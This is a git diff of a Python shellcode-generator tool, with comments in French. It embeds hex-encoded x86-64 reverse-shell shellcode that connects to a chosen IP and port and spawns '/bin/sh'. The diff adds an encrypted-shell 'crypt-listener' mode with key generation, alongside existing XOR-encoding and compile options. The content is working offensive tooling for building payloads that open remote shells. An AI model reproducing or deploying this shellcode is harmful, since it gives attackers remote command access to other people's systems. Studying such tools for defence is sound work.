@@ -28,8 +28,10 @@ def main():
 
     '''
 
-    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6ip56port666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
-    
+    basicshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6ip56port666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
+    cryptshell = "portipkey"
+    baseshell = basicshell
+
     parser = argwrap(ArgumentParser().prog)
     parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address', required=True)
     parser.add_argument('-p', '--port', dest='port', help='Port to bind', required=True)
@@ -39,12 +41,17 @@ def main():
     parser.add_argument('-hs', '--hide-shellcode', dest='hide_shellcode', help="Hide the shellcode printing", default=False, action='store_true', required=False)
     parser.add_argument('-v', '--verbose', dest='verbosity', help='Add verbosity printing', action='store_true', default=False, required=False)
     parser.add_argument('-o', '--outfile', dest='outfile', help='Outfile shellcode\'s name', default='shellcode.txt', required=False)
+    parser.add_argument('-cl','--crypt-listener',dest='iscrypt',help='Create a cryptshell with his listener',default=False,action='store_true',required=False)
     args = parser.parse_args()
 
     if len(argv) < 5:
         print(f'{banner}')
         parser.print_help()
         exit(1)
+    
+    # Si le mode iscrypt est activé, on switch de shell
+    if args.iscrypt : 
+        baseshell = cryptshell
 
     iphex = dechex.iphex(args.ip, args.endianness)
     porthex = dechex.porthex(args.port, args.endianness)
@@ -54,7 +61,12 @@ def main():
     if iphex and porthex:
         ipbloc = bloc.ip(iphex)
         portbloc = bloc.port(porthex)
-        shellcode = build.shellcode(baseshell, ipbloc, portbloc, xornb, outfile)
+        key = ""
+
+        if args.iscrypt: # on génère la clé si le mode crypt est utilisé
+            key = bloc.key()
+
+        shellcode = build.shellcode(baseshell, ipbloc, portbloc, xornb, outfile, args.iscrypt, key)
         if args.compile:
             build.compile()
 
